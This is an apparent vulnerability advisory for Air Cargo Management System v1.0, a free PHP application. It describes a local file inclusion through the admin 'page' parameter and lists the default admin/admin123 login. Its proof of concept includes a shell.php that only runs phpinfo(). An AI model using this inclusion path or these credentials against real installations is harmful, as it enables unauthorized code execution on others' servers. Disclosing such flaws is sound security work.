# Air Cargo Management System v1.0 by oretnom23 has The local file contains

vendors: https://www.sourcecodester.com/php/15188/air-cargo-management-system-php-oop-free-source-code.html

Vulnerability File: ip/acms/admin/?page=

Vulnerability location: ip/acms/admin/?page=, page

The password for the backend login account is: admin/admin123

Payload: http://ip/acms/admin/?page=shell


![image](https://user-images.githubusercontent.com/54017627/166401497-32743d6a-1dbf-4c05-a041-2243929c5e9f.png)

We create a shell.php under the admin directory of the website, which reads "<? phpinfo ();? > "
![image](https://user-images.githubusercontent.com/54017627/166400989-1e0d7bf7-0a3b-4644-8b23-83965140409b.png)

And visit http://ip/acms/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/166401596-847e9629-c9cd-45e8-920a-2c585727d913.png)

